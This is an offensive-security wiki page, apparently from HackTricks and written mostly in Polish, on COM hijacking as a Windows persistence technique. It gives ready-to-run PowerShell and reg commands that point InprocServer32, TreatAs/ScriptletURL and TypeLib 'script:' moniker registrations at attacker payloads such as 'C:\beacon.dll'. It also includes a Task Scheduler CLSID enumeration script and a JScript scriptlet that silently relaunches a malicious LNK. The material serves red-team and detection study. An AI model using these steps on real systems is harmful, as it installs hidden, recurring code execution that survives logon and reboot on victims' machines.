# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Wyszukiwanie nieistniejących komponentów COM

Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hijacking** może być użyte jako **mechanizm utrzymania dostępu**. Używając `procmon` łatwo znaleźć rejestry COM, których jeszcze nie ma, a które mógłby utworzyć atakujący. Klasyczne filtry:

- operacje **RegOpenKey**.
- gdzie _Result_ ma wartość **NAME NOT FOUND**.
- a _Path_ kończy się na **InprocServer32**.

Przydatne warianty podczas poszukiwań:

- Sprawdź też brakujące klucze **`LocalServer32`**. Niektóre klasy COM są serwerami poza-procesowymi i uruchomią EXE kontrolowane przez atakującego zamiast DLL.
- Szukaj operacji rejestru **`TreatAs`** i **`ScriptletURL`** oprócz `InprocServer32`. Ostatnie treści detekcyjne i analizy malware często je wyróżniają, ponieważ są dużo rzadsze niż standardowe rejestracje COM i dlatego dają wysoki sygnał.
- Sklonuj prawidłowy **`ThreadingModel`** z oryginalnego `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` przy klonowaniu rejestracji do HKCU. Użycie niewłaściwego modelu często powoduje problemy z aktywacją i sprawia, że hijack jest bardziej widoczny.
- Na systemach 64-bitowych sprawdź zarówno widoki 64-bitowe jak i 32-bitowe (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`), ponieważ aplikacje 32-bitowe mogą rozwiązywać inną rejestrację COM.

Gdy zdecydujesz, który nieistniejący COM chcesz podszyć, wykonaj następujące polecenia. _Uważaj, jeśli zdecydujesz się podszyć pod COM, który jest ładowany co kilka sekund, ponieważ może to być przesadą._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Podatne na przejęcie komponenty COM w Task Scheduler

Zadania Windows używają Custom Triggers do wywoływania obiektów COM, a ponieważ są wykonywane przez Task Scheduler, łatwiej przewidzieć, kiedy zostaną uruchomione.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Analizując wynik możesz wybrać zadanie, które na przykład będzie uruchamiane **za każdym razem, gdy użytkownik się zaloguje**.

Teraz, szukając CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU, zwykle stwierdzisz, że wartość nie istnieje w HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Następnie możesz po prostu utworzyć wpis HKCU i za każdym logowaniem użytkownika twój backdoor zostanie uruchomiony.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` umożliwia emulowanie jednego CLSID przez inny. Z ofensywnego punktu widzenia oznacza to, że możesz zostawić oryginalny CLSID bez zmian, utworzyć drugi CLSID przypisany do użytkownika, który wskazuje na `scrobj.dll`, a następnie przekierować rzeczywisty obiekt COM na złośliwy za pomocą `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Jest to przydatne, gdy:

- aplikacja docelowa już tworzy instancję stabilnego CLSID przy logowaniu lub przy uruchomieniu aplikacji
- chcesz przekierowanie ograniczone wyłącznie do rejestru zamiast zastępować oryginalny `InprocServer32`
- chcesz wykonać lokalny lub zdalny `.sct` scriptlet za pomocą wartości `ScriptletURL`

Przykłowy przebieg (dostosowany z publicznego Atomic Red Team tradecraft i starszych badań nad nadużyciami rejestru COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notatki:

- `scrobj.dll` odczytuje wartość `ScriptletURL` i uruchamia wskazane `.sct`, więc możesz trzymać payload jako lokalny plik lub pobrać go zdalnie przez HTTP/HTTPS.
- `TreatAs` jest szczególnie przydatne, gdy oryginalna rejestracja COM jest kompletna i stabilna w HKLM, ponieważ potrzebujesz tylko małego przekierowania na poziomie użytkownika zamiast odwzorowywać całe drzewo.
- Aby zweryfikować bez czekania na naturalny wyzwalacz, możesz zainstancjonować fałszywy ProgID/CLSID ręcznie przy użyciu `rundll32.exe -sta <ProgID-or-CLSID>`, jeśli docelowa klasa obsługuje aktywację STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. Gdy serwer COM jest instancjonowany, OS może także załadować powiązany TypeLib, odczytując klucze rejestru pod `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zastąpiona **moniker**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet w momencie rozwiązywania TypeLib — powodując stealthy persistence, które uruchamia się, gdy używane są typowe komponenty.

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Kroki (PowerShell)

1) Zidentyfikuj TypeLib (LIBID) używany przez CLSID o wysokiej częstotliwości występowania. Przykładowy CLSID często nadużywany przez malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Wskaż ścieżkę TypeLib dla użytkownika na lokalny scriptlet, używając monikera `script:` (nie są wymagane uprawnienia administratora):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Umieść minimalny JScript `.sct`, który ponownie uruchomi twój główny payload (np. `.lnk` używany przez początkowy łańcuch):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Wyzwalanie – otwarcie IE, aplikacji osadzającej kontrolkę WebBrowser, a nawet rutynowa aktywność Explorer spowodują załadowanie TypeLib i wykonanie scriptlet, ponownie aktywując łańcuch przy logon/reboot.

Czyszczenie
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Uwagi
- To samo podejście można zastosować do innych często występujących komponentów COM; zawsze najpierw ustal prawdziwy `LIBID` z `HKCR\CLSID\{CLSID}\TypeLib`.
- Na systemach 64-bitowych możesz także wypełnić podklucz `win64` dla 64-bitowych konsumentów.

## Źródła

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
